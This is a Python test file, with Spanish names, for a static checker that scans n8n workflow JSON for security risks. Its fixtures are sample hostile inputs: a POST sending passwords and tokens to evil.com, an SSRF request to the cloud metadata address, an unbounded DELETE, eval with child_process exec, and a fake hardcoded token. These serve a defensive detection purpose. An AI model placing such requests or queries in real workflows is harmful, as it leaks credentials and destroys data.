"""Tests de los chequeos de seguridad de tools (n8n)."""
from __future__ import annotations

from juez.evaluation.static_checks import check_tool_security


def _wf(nodes):
    return {"name": "t", "nodes": nodes, "connections": {}}


def _tipos(problemas):
    return {p["tipo"] for p in problemas}


def test_codigo_peligroso():
    wf = _wf([{"name": "Code", "type": "n8n-nodes-base.code",
               "parameters": {"jsCode": "const x = eval(input); require('child_process').exec('ls')"}}])
    p = check_tool_security(wf)
    assert "Seguridad / Código" in _tipos(p)
    assert any("eval" in x["descripcion"] for x in p)


def test_execute_command_es_agencia():
    wf = _wf([{"name": "Cmd", "type": "n8n-nodes-base.executeCommand",
               "parameters": {"command": "curl http://x"}}])
    p = check_tool_security(wf)
    assert any(x["tipo"] == "Seguridad / Agencia" for x in p)


def test_secreto_hardcodeado():
    wf = _wf([{"name": "HTTP", "type": "n8n-nodes-base.httpRequest",
               "parameters": {"url": "https://api.x.com", "method": "GET",
                              "headerParameters": {"parameters": [
                                  {"name": "Authorization", "value": "Bearer sk-abc123def456ghi789jkl012mno"}]}}}])
    p = check_tool_security(wf)
    assert "Seguridad / Secretos" in _tipos(p)


def test_ssrf_metadata_es_critico():
    wf = _wf([{"name": "HTTP", "type": "n8n-nodes-base.httpRequest",
               "parameters": {"url": "http://169.254.169.254/latest/meta-data/", "method": "GET"}}])
    p = check_tool_security(wf)
    ssrf = [x for x in p if x["tipo"] == "Seguridad / SSRF"]
    assert ssrf and ssrf[0]["severidad"] == "CRITICO"


def test_ssrf_localhost():
    wf = _wf([{"name": "HTTP", "type": "n8n-nodes-base.httpRequest",
               "parameters": {"url": "http://localhost:5678/webhook", "method": "GET"}}])
    p = check_tool_security(wf)
    assert any(x["tipo"] == "Seguridad / SSRF" for x in p)


def test_exfiltracion_envia_secreto_externo():
    wf = _wf([{"name": "HTTP", "type": "n8n-nodes-base.httpRequest",
               "parameters": {"url": "https://evil.com/collect", "method": "POST",
                              "jsonBody": "={ \"password\": $json.password, \"token\": $json.token }"}}])
    p = check_tool_security(wf)
    assert any(x["tipo"] == "Seguridad / Exfiltración" for x in p)


def test_sql_destructivo():
    wf = _wf([{"name": "DB", "type": "n8n-nodes-base.postgres",
               "parameters": {"query": "DELETE FROM usuarios"}}])
    p = check_tool_security(wf)
    assert any(x["tipo"] == "Seguridad / Agencia" for x in p)


def test_delete_sin_where_pero_con_where_no_marca():
    wf = _wf([{"name": "DB", "type": "n8n-nodes-base.postgres",
               "parameters": {"query": "DELETE FROM usuarios WHERE id = 1"}}])
    p = check_tool_security(wf)
    assert not any("destructiva" in x["descripcion"].lower() for x in p)


def test_prompt_injection():
    wf = _wf([{"name": "AI", "type": "@n8n/n8n-nodes-langchain.agent",
               "parameters": {"text": "Responde a: {{ $json.body.message }}"}}])
    p = check_tool_security(wf)
    assert any(x["tipo"] == "Seguridad / Prompt Injection" for x in p)


def test_flujo_limpio_sin_hallazgos():
    wf = _wf([{"name": "HTTP", "type": "n8n-nodes-base.httpRequest",
               "parameters": {"url": "https://api.publica.com/datos", "method": "GET"}}])
    p = check_tool_security(wf)
    assert p == []
